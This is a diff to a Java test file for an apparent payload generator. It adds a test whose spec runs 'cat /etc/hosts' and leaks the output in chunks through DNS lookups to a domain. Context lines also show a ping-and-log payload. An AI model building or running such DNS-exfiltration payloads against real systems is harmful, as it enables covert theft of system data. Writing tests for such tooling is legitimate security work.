@@ -191,6 +191,16 @@ public class GeneratorTest {
                 "\t{cmd:\"shc\", val:\"ping -c 4 google.com >> /tmp/googleping 2>> /tmp/googleping && sleep 3\"}\n" +
                 "]}");
     }
+
+    @Test
+    public void testPayload20 () throws Exception {
+//        {exec: [
+//            {cmd:"shcDnsLeak", val:"cat /etc/hosts", domain:"google.com", offset:30, step:30}
+//        ]}
+        testPayload("{exec: [\n" +
+                "\t{cmd:\"shcDnsLeak\", val:\"cat /etc/hosts\", domain:\"google.com\", offset:30, step:30}\n" +
+                "]}");
+    }
     public static String testPayload(String payloadSpec) throws Exception {
         String payloadBin = build(payloadSpec);
         String origPayload = payloadBin;
